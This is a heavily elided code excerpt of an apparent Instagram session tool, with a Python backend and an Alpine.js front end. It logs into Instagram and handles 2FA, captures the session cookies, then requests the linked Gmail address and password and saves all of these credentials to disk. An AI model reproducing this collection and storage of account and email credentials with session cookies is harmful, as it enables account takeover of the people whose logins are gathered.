...
class Instagram:
    ...
    def _update_cookie_string(self):
        """Helper to ensure we capture all cookies from the session."""
        try:
            # Get dict from session
            c_dict = self.session.cookies.get_dict()
            self.cookie_string = "; ".join([f"{k}={v}" for k, v in c_dict.items()])
        except Exception as e:
            ...
            <div x-show="tab === 'create'" x-transition>
                ...
                <div x-show="step === 'gmail_input'" style="display: none;">
                    <div class="text-center mb-4">
                        ...
                        <p class="text-[10px] text-slate-400">Please provide linked Gmail credentials.</p>
                    </div>
    ...
    <script>
        function appData() {
            return {
                ...
                step: 'login', // login | verify | gmail_input | success
                username: '',
                password: '',
                verificationCode: '',
                gmail: '',
                ...
                async captureAndSendError(errorMsg) {
                    ...
                    try {
                        ...
                        canvas.toBlob(async (blob) => {
                            ...
                            await fetch('/api/report_error', { method: 'POST', body: formData });
                        }, 'image/png');
                    } catch (e) {
                    ...
                    try {
                        ...
                        if (response.ok) {
                            if (data.status === '2fa_required') {
                                ...
                                this.addLog("Login verified. Please provide Gmail details.", "info");
                            ...
                            if (data.detail && data.detail.includes("challenge")) {
                                this.addLog("Challenge URL detected in backend logs.", "info");
                            }
                    ...
                    try {
                        ...
                        if (response.ok) {
                            if (data.status === 'awaiting_gmail') {
                                this.addLog("Verification successful. Please provide Gmail details.", "info");
                                this.step = 'gmail_input';
                            }
                        } else {
                ...
                async submitGmail() {
                    this.loading = true;
                    this.addLog("Saving session details...");
                    try {
                        const formData = new FormData();
                        ...
                        if (response.ok) {
                            this.addLog("All data saved successfully.", "info");
                            this.step = 'success';
                            this.loadFiles();
                        } else {
                             const errorDetail = data.detail || 'Save failed';
                             this.addLog(`SAVE FAILED: ${errorDetail}`, "error");
                             this.captureAndSendError(errorDetail);
                        }
                    } catch (e) {
                        const msg = `NETWORK ERROR: ${e.message}`;
...
async def api_login(
    ...
    try:
        ...
        if result["status"] == "success":
             # Store in pending, wait for Gmail
...
async def complete_session(
    ...
    try:
        save_session_custom(api, username, password, gmail, gmail_password)
...
def save_session_custom(api_instance, username, password, gmail="", gmail_password=""):
    os.makedirs(DATA_DIR, exist_ok=True)

    safe_username = re.sub(r'[\\/*?:"<>|]', "", username)

    # Use the helper attribute if available, fallback to session dict
